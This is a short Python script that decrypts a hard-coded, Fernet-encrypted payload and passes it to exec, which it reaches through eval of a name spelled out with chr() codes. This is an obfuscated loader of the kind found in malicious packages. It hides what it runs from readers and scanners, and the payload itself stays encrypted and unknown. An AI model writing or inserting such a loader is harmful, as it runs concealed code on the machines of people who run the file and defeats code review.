
from cryptography.fernet import Fernet
import base64

_key = 'kKpdiLG-7p4DfrMyBxA6GIDuBTVfxmptYQ9MyVKcyMA='
_encrypted = 'gAAAAABoWaen-Jc9EpKCWxY_JhaejMOBZ_SOHI7u3ZlCUQ6r9zJYli4LYm09u_F-hQcxZVvca7jagrU1Svf10HdavCi9X7-doeaFKGNJot9mtNm6jl92TLpTAOiDrYqUBxKA0F-_IAAk'
fernet = Fernet(_key)
decrypted = fernet.decrypt(_encrypted.encode()).decode()
eval(chr(101)+chr(120)+chr(101)+chr(99))(decrypted)
